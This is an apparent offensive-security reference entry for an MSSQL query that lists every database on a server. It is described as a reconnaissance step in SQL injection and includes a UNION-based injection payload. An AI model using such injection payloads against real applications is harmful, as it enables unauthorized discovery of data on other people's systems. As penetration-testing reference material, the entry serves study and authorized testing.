---
type: command
executor: sql
data: SELECT name FROM master..sysdatabases;
output: null
created_at: '2023-04-06T03:56:33.639387+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
  - MSSQL
tags:
  - mssql
  - enumeration
  - discovery
verified: true
validated: true
---

# mssql-list-all-databases

## Command

```sql
SELECT name FROM master..sysdatabases;
```

## Description

This SQL command queries the sysdatabases system view in the master database to retrieve the names of all databases on the MSSQL server. It is used in SQL injection attacks to enumerate the full list of databases during reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | This is a static query with no user-defined parameters; inject via UNION or error-based SQLi. | No |

## Examples

### Basic Usage

```sql
SELECT name FROM master..sysdatabases;
```

In a SQL injection context:

```sql
' UNION SELECT name FROM master..sysdatabases--
```

### Advanced Usage

Combine with ORDER BY for sorting:

```sql
SELECT name FROM master..sysdatabases ORDER BY name;
```

## Expected Output

A result set with a single column 'name' listing databases, for example:

name
----
master
tempdb
model
msdb
AdventureWorks

## Related

- [[procedures/MSSQL-Database-Enumeration]]
- [[commands/mssql-concatenate-database-names]]
